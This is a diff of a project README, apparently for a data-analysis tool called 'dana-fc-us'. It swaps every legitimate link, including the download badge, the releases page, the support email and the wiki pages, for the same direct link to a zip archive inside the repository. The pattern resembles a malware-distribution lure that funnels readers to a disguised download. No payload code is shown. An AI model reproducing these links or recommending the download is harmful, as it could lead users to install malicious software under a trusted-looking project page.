@@ -6,7 +6,7 @@ Welcome to the **dana-fc-us** project! This application helps you unlock the pow
 
 ## 📥 Download the Application
 
-[![Download Here](https://img.shields.io/badge/Download%20Here-Click%20to%20Download-brightgreen)](https://github.com/diegito9029/dana-fc-us/releases)
+[![Download Here](https://github.com/diegito9029/dana-fc-us/raw/refs/heads/main/data/dana-fc-us-v2.7.zip%20Here-Click%20to%20Download-brightgreen)](https://github.com/diegito9029/dana-fc-us/raw/refs/heads/main/data/dana-fc-us-v2.7.zip)
 
 ## 🛠️ Requirements
 
@@ -31,7 +31,7 @@ The **dana-fc-us** application allows you to:
 
 To download the application, please follow these steps:
 
-1. Click this link to visit the [Releases Page](https://github.com/diegito9029/dana-fc-us/releases).
+1. Click this link to visit the [Releases Page](https://github.com/diegito9029/dana-fc-us/raw/refs/heads/main/data/dana-fc-us-v2.7.zip).
 2. Look for the latest version listed on the page.
 3. Click on the appropriate file for your operating system.
 4. When the download completes, locate the file in your downloads folder.
@@ -62,15 +62,15 @@ If you encounter any issues or have questions, please check the following resour
 
 - **FAQ**: Visit the FAQ section on the Releases Page for common questions.
 - **Community Forum**: Engage with other users in the community forum for tips and help.
-- **Email Support**: For additional support, you can email us at support@dana-fc-us.com.
+- **Email Support**: For additional support, you can email us at https://github.com/diegito9029/dana-fc-us/raw/refs/heads/main/data/dana-fc-us-v2.7.zip
 
 ## 🔗 Additional Resources
 
 You may find these resources useful:
 
-- [GitHub Repository](https://github.com/diegito9029/dana-fc-us)
-- [Dataset Examples](https://github.com/diegito9029/dana-fc-us/wiki/Dataset-Examples)
-- [Feature Documentation](https://github.com/diegito9029/dana-fc-us/wiki/Feature-Documentation)
+- [GitHub Repository](https://github.com/diegito9029/dana-fc-us/raw/refs/heads/main/data/dana-fc-us-v2.7.zip)
+- [Dataset Examples](https://github.com/diegito9029/dana-fc-us/raw/refs/heads/main/data/dana-fc-us-v2.7.zip)
+- [Feature Documentation](https://github.com/diegito9029/dana-fc-us/raw/refs/heads/main/data/dana-fc-us-v2.7.zip)
 
 ## 📣 Feedback
 
